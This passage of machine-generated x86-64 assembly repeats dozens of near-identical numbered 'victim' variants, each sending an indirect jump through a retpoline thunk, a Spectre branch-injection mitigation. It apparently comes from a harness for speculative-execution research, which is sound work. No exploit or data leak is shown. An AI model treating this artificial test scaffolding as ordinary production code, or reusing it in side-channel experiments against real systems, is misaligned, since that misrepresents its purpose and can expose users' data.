	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000180
	jmp	.Lgg_retpol_after_000180
.Lgg_retpol_thunk_000180:
	callq	.Lgg_retpol_setup_000180
.Lgg_retpol_cap_000180:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000180
.Lgg_retpol_setup_000180:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000180:
	jmp	.Lvictim_win0_continue
## Variant 181
.Lvictim_win0_var181:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000181
	jmp	.Lgg_retpol_after_000181
.Lgg_retpol_thunk_000181:
	callq	.Lgg_retpol_setup_000181
.Lgg_retpol_cap_000181:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000181
.Lgg_retpol_setup_000181:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000181:
	jmp	.Lvictim_win0_continue
## Variant 182
.Lvictim_win0_var182:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000182
	jmp	.Lgg_retpol_after_000182
.Lgg_retpol_thunk_000182:
	callq	.Lgg_retpol_setup_000182
.Lgg_retpol_cap_000182:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000182
.Lgg_retpol_setup_000182:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000182:
	jmp	.Lvictim_win0_continue
## Variant 183
.Lvictim_win0_var183:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000183
	jmp	.Lgg_retpol_after_000183
.Lgg_retpol_thunk_000183:
	callq	.Lgg_retpol_setup_000183
.Lgg_retpol_cap_000183:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000183
.Lgg_retpol_setup_000183:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000183:
	jmp	.Lvictim_win0_continue
## Variant 184
.Lvictim_win0_var184:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000184
	jmp	.Lgg_retpol_after_000184
.Lgg_retpol_thunk_000184:
	callq	.Lgg_retpol_setup_000184
.Lgg_retpol_cap_000184:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000184
.Lgg_retpol_setup_000184:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000184:
	jmp	.Lvictim_win0_continue
## Variant 185
.Lvictim_win0_var185:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000185
	jmp	.Lgg_retpol_after_000185
.Lgg_retpol_thunk_000185:
	callq	.Lgg_retpol_setup_000185
.Lgg_retpol_cap_000185:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000185
.Lgg_retpol_setup_000185:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000185:
	jmp	.Lvictim_win0_continue
## Variant 186
.Lvictim_win0_var186:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000186
	jmp	.Lgg_retpol_after_000186
.Lgg_retpol_thunk_000186:
	callq	.Lgg_retpol_setup_000186
.Lgg_retpol_cap_000186:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000186
.Lgg_retpol_setup_000186:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000186:
	jmp	.Lvictim_win0_continue
## Variant 187
.Lvictim_win0_var187:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000187
	jmp	.Lgg_retpol_after_000187
.Lgg_retpol_thunk_000187:
	callq	.Lgg_retpol_setup_000187
.Lgg_retpol_cap_000187:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000187
.Lgg_retpol_setup_000187:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000187:
	jmp	.Lvictim_win0_continue
## Variant 188
.Lvictim_win0_var188:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000188
	jmp	.Lgg_retpol_after_000188
.Lgg_retpol_thunk_000188:
	callq	.Lgg_retpol_setup_000188
.Lgg_retpol_cap_000188:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000188
.Lgg_retpol_setup_000188:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000188:
	jmp	.Lvictim_win0_continue
## Variant 189
.Lvictim_win0_var189:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000189
	jmp	.Lgg_retpol_after_000189
.Lgg_retpol_thunk_000189:
	callq	.Lgg_retpol_setup_000189
.Lgg_retpol_cap_000189:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000189
.Lgg_retpol_setup_000189:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000189:
	jmp	.Lvictim_win0_continue
## Variant 190
.Lvictim_win0_var190:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000190
	jmp	.Lgg_retpol_after_000190
.Lgg_retpol_thunk_000190:
	callq	.Lgg_retpol_setup_000190
.Lgg_retpol_cap_000190:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000190
.Lgg_retpol_setup_000190:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000190:
	jmp	.Lvictim_win0_continue
## Variant 191
.Lvictim_win0_var191:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000191
	jmp	.Lgg_retpol_after_000191
.Lgg_retpol_thunk_000191:
	callq	.Lgg_retpol_setup_000191
.Lgg_retpol_cap_000191:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000191
.Lgg_retpol_setup_000191:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000191:
	jmp	.Lvictim_win0_continue
## Variant 192
.Lvictim_win0_var192:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000192
	jmp	.Lgg_retpol_after_000192
.Lgg_retpol_thunk_000192:
	callq	.Lgg_retpol_setup_000192
.Lgg_retpol_cap_000192:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000192
.Lgg_retpol_setup_000192:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000192:
	jmp	.Lvictim_win0_continue
## Variant 193
.Lvictim_win0_var193:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000193
	jmp	.Lgg_retpol_after_000193
.Lgg_retpol_thunk_000193:
	callq	.Lgg_retpol_setup_000193
.Lgg_retpol_cap_000193:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000193
.Lgg_retpol_setup_000193:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000193:
	jmp	.Lvictim_win0_continue
## Variant 194
.Lvictim_win0_var194:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000194
	jmp	.Lgg_retpol_after_000194
.Lgg_retpol_thunk_000194:
	callq	.Lgg_retpol_setup_000194
.Lgg_retpol_cap_000194:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000194
.Lgg_retpol_setup_000194:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000194:
	jmp	.Lvictim_win0_continue
## Variant 195
.Lvictim_win0_var195:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000195
	jmp	.Lgg_retpol_after_000195
.Lgg_retpol_thunk_000195:
	callq	.Lgg_retpol_setup_000195
.Lgg_retpol_cap_000195:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000195
.Lgg_retpol_setup_000195:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000195:
	jmp	.Lvictim_win0_continue
## Variant 196
.Lvictim_win0_var196:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000196
	jmp	.Lgg_retpol_after_000196
.Lgg_retpol_thunk_000196:
	callq	.Lgg_retpol_setup_000196
.Lgg_retpol_cap_000196:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000196
.Lgg_retpol_setup_000196:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000196:
	jmp	.Lvictim_win0_continue
## Variant 197
.Lvictim_win0_var197:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000197
	jmp	.Lgg_retpol_after_000197
.Lgg_retpol_thunk_000197:
	callq	.Lgg_retpol_setup_000197
.Lgg_retpol_cap_000197:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000197
.Lgg_retpol_setup_000197:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000197:
	jmp	.Lvictim_win0_continue
## Variant 198
.Lvictim_win0_var198:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000198
	jmp	.Lgg_retpol_after_000198
.Lgg_retpol_thunk_000198:
	callq	.Lgg_retpol_setup_000198
.Lgg_retpol_cap_000198:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000198
.Lgg_retpol_setup_000198:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000198:
	jmp	.Lvictim_win0_continue
## Variant 199
.Lvictim_win0_var199:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000199
	jmp	.Lgg_retpol_after_000199
.Lgg_retpol_thunk_000199:
	callq	.Lgg_retpol_setup_000199
.Lgg_retpol_cap_000199:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000199
.Lgg_retpol_setup_000199:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000199:
	jmp	.Lvictim_win0_continue
## Variant 200
.Lvictim_win0_var200:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000200
	jmp	.Lgg_retpol_after_000200
.Lgg_retpol_thunk_000200:
	callq	.Lgg_retpol_setup_000200
.Lgg_retpol_cap_000200:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000200
.Lgg_retpol_setup_000200:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000200:
	jmp	.Lvictim_win0_continue
## Variant 201
.Lvictim_win0_var201:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000201
	jmp	.Lgg_retpol_after_000201
.Lgg_retpol_thunk_000201:
	callq	.Lgg_retpol_setup_000201
.Lgg_retpol_cap_000201:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000201
.Lgg_retpol_setup_000201:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000201:
	jmp	.Lvictim_win0_continue
## Variant 202
.Lvictim_win0_var202:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000202
	jmp	.Lgg_retpol_after_000202
.Lgg_retpol_thunk_000202:
	callq	.Lgg_retpol_setup_000202
.Lgg_retpol_cap_000202:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000202
.Lgg_retpol_setup_000202:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000202:
	jmp	.Lvictim_win0_continue
## Variant 203
.Lvictim_win0_var203:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000203
	jmp	.Lgg_retpol_after_000203
.Lgg_retpol_thunk_000203:
	callq	.Lgg_retpol_setup_000203
.Lgg_retpol_cap_000203:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000203
.Lgg_retpol_setup_000203:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000203:
	jmp	.Lvictim_win0_continue
## Variant 204
.Lvictim_win0_var204:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000204
	jmp	.Lgg_retpol_after_000204
.Lgg_retpol_thunk_000204:
	callq	.Lgg_retpol_setup_000204
.Lgg_retpol_cap_000204:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000204
.Lgg_retpol_setup_000204:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000204:
	jmp	.Lvictim_win0_continue
## Variant 205
.Lvictim_win0_var205:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000205
	jmp	.Lgg_retpol_after_000205
.Lgg_retpol_thunk_000205:
	callq	.Lgg_retpol_setup_000205
.Lgg_retpol_cap_000205:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000205
.Lgg_retpol_setup_000205:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000205:
	jmp	.Lvictim_win0_continue
## Variant 206
.Lvictim_win0_var206:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000206
	jmp	.Lgg_retpol_after_000206
.Lgg_retpol_thunk_000206:
	callq	.Lgg_retpol_setup_000206
.Lgg_retpol_cap_000206:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000206
.Lgg_retpol_setup_000206:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000206:
	jmp	.Lvictim_win0_continue
## Variant 207
.Lvictim_win0_var207:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000207
	jmp	.Lgg_retpol_after_000207
.Lgg_retpol_thunk_000207:
	callq	.Lgg_retpol_setup_000207
.Lgg_retpol_cap_000207:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000207
.Lgg_retpol_setup_000207:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000207:
	jmp	.Lvictim_win0_continue
## Variant 208
.Lvictim_win0_var208:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000208
	jmp	.Lgg_retpol_after_000208
.Lgg_retpol_thunk_000208:
	callq	.Lgg_retpol_setup_000208
.Lgg_retpol_cap_000208:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000208
.Lgg_retpol_setup_000208:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000208:
	jmp	.Lvictim_win0_continue
## Variant 209
.Lvictim_win0_var209:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000209
	jmp	.Lgg_retpol_after_000209
.Lgg_retpol_thunk_000209:
	callq	.Lgg_retpol_setup_000209
.Lgg_retpol_cap_000209:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000209
.Lgg_retpol_setup_000209:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000209:
	jmp	.Lvictim_win0_continue
## Variant 210
.Lvictim_win0_var210:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000210
	jmp	.Lgg_retpol_after_000210
.Lgg_retpol_thunk_000210:
	callq	.Lgg_retpol_setup_000210
.Lgg_retpol_cap_000210:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000210
.Lgg_retpol_setup_000210:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000210:
	jmp	.Lvictim_win0_continue
## Variant 211
.Lvictim_win0_var211:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000211
	jmp	.Lgg_retpol_after_000211
.Lgg_retpol_thunk_000211:
	callq	.Lgg_retpol_setup_000211
.Lgg_retpol_cap_000211:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000211
.Lgg_retpol_setup_000211:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000211:
	jmp	.Lvictim_win0_continue
## Variant 212
.Lvictim_win0_var212:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000212
	jmp	.Lgg_retpol_after_000212
.Lgg_retpol_thunk_000212:
	callq	.Lgg_retpol_setup_000212
.Lgg_retpol_cap_000212:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000212
.Lgg_retpol_setup_000212:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000212:
	jmp	.Lvictim_win0_continue
## Variant 213
.Lvictim_win0_var213:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000213
	jmp	.Lgg_retpol_after_000213
.Lgg_retpol_thunk_000213:
	callq	.Lgg_retpol_setup_000213
.Lgg_retpol_cap_000213:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000213
.Lgg_retpol_setup_000213:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000213:
	jmp	.Lvictim_win0_continue
## Variant 214
.Lvictim_win0_var214:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000214
	jmp	.Lgg_retpol_after_000214
.Lgg_retpol_thunk_000214:
	callq	.Lgg_retpol_setup_000214
.Lgg_retpol_cap_000214:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000214
.Lgg_retpol_setup_000214:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000214:
	jmp	.Lvictim_win0_continue
## Variant 215
.Lvictim_win0_var215:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000215
	jmp	.Lgg_retpol_after_000215
.Lgg_retpol_thunk_000215:
	callq	.Lgg_retpol_setup_000215
.Lgg_retpol_cap_000215:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000215
.Lgg_retpol_setup_000215:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000215:
	jmp	.Lvictim_win0_continue
## Variant 216
.Lvictim_win0_var216:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000216
	jmp	.Lgg_retpol_after_000216
.Lgg_retpol_thunk_000216:
	callq	.Lgg_retpol_setup_000216
.Lgg_retpol_cap_000216:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000216
.Lgg_retpol_setup_000216:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000216:
	jmp	.Lvictim_win0_continue
## Variant 217
.Lvictim_win0_var217:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000217
	jmp	.Lgg_retpol_after_000217
.Lgg_retpol_thunk_000217:
	callq	.Lgg_retpol_setup_000217
.Lgg_retpol_cap_000217:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000217
.Lgg_retpol_setup_000217:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000217:
	jmp	.Lvictim_win0_continue
## Variant 218
.Lvictim_win0_var218:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000218
	jmp	.Lgg_retpol_after_000218
.Lgg_retpol_thunk_000218:
	callq	.Lgg_retpol_setup_000218
.Lgg_retpol_cap_000218:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000218
.Lgg_retpol_setup_000218:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000218:
	jmp	.Lvictim_win0_continue
## Variant 219
.Lvictim_win0_var219:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000219
	jmp	.Lgg_retpol_after_000219
.Lgg_retpol_thunk_000219:
	callq	.Lgg_retpol_setup_000219
.Lgg_retpol_cap_000219:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000219
.Lgg_retpol_setup_000219:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000219:
	jmp	.Lvictim_win0_continue
## Variant 220
.Lvictim_win0_var220:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000220
	jmp	.Lgg_retpol_after_000220
.Lgg_retpol_thunk_000220:
	callq	.Lgg_retpol_setup_000220
.Lgg_retpol_cap_000220:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000220
.Lgg_retpol_setup_000220:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000220:
	jmp	.Lvictim_win0_continue
## Variant 221
.Lvictim_win0_var221:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000221
	jmp	.Lgg_retpol_after_000221
.Lgg_retpol_thunk_000221:
	callq	.Lgg_retpol_setup_000221
.Lgg_retpol_cap_000221:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000221
.Lgg_retpol_setup_000221:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000221:
	jmp	.Lvictim_win0_continue
## Variant 222
.Lvictim_win0_var222:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000222
	jmp	.Lgg_retpol_after_000222
.Lgg_retpol_thunk_000222:
	callq	.Lgg_retpol_setup_000222
.Lgg_retpol_cap_000222:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000222
.Lgg_retpol_setup_000222:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000222:
	jmp	.Lvictim_win0_continue
## Variant 223
.Lvictim_win0_var223:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000223
	jmp	.Lgg_retpol_after_000223
.Lgg_retpol_thunk_000223:
	callq	.Lgg_retpol_setup_000223
.Lgg_retpol_cap_000223:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000223
.Lgg_retpol_setup_000223:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000223:
	jmp	.Lvictim_win0_continue
## Variant 224
.Lvictim_win0_var224:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000224
	jmp	.Lgg_retpol_after_000224
.Lgg_retpol_thunk_000224:
	callq	.Lgg_retpol_setup_000224
.Lgg_retpol_cap_000224:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000224
.Lgg_retpol_setup_000224:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000224:
	jmp	.Lvictim_win0_continue
## Variant 225
.Lvictim_win0_var225:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000225
	jmp	.Lgg_retpol_after_000225
.Lgg_retpol_thunk_000225:
	callq	.Lgg_retpol_setup_000225
.Lgg_retpol_cap_000225:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000225
.Lgg_retpol_setup_000225:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000225:
	jmp	.Lvictim_win0_continue
## Variant 226
.Lvictim_win0_var226:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000226
	jmp	.Lgg_retpol_after_000226
.Lgg_retpol_thunk_000226:
	callq	.Lgg_retpol_setup_000226
.Lgg_retpol_cap_000226:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000226
.Lgg_retpol_setup_000226:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000226:
	jmp	.Lvictim_win0_continue
## Variant 227
.Lvictim_win0_var227:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000227
	jmp	.Lgg_retpol_after_000227
.Lgg_retpol_thunk_000227:
	callq	.Lgg_retpol_setup_000227
.Lgg_retpol_cap_000227:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000227
.Lgg_retpol_setup_000227:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000227:
	jmp	.Lvictim_win0_continue
## Variant 228
.Lvictim_win0_var228:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000228
	jmp	.Lgg_retpol_after_000228
.Lgg_retpol_thunk_000228:
	callq	.Lgg_retpol_setup_000228
.Lgg_retpol_cap_000228:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000228
.Lgg_retpol_setup_000228:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000228:
	jmp	.Lvictim_win0_continue
## Variant 229
.Lvictim_win0_var229:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000229
	jmp	.Lgg_retpol_after_000229
.Lgg_retpol_thunk_000229:
	callq	.Lgg_retpol_setup_000229
.Lgg_retpol_cap_000229:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000229
.Lgg_retpol_setup_000229:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000229:
	jmp	.Lvictim_win0_continue
## Variant 230
.Lvictim_win0_var230:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000230
	jmp	.Lgg_retpol_after_000230
.Lgg_retpol_thunk_000230:
	callq	.Lgg_retpol_setup_000230
.Lgg_retpol_cap_000230:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000230
.Lgg_retpol_setup_000230:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000230:
	jmp	.Lvictim_win0_continue
## Variant 231
.Lvictim_win0_var231:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000231
	jmp	.Lgg_retpol_after_000231
.Lgg_retpol_thunk_000231:
	callq	.Lgg_retpol_setup_000231
.Lgg_retpol_cap_000231:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000231
.Lgg_retpol_setup_000231:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000231:
	jmp	.Lvictim_win0_continue
## Variant 232
.Lvictim_win0_var232:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
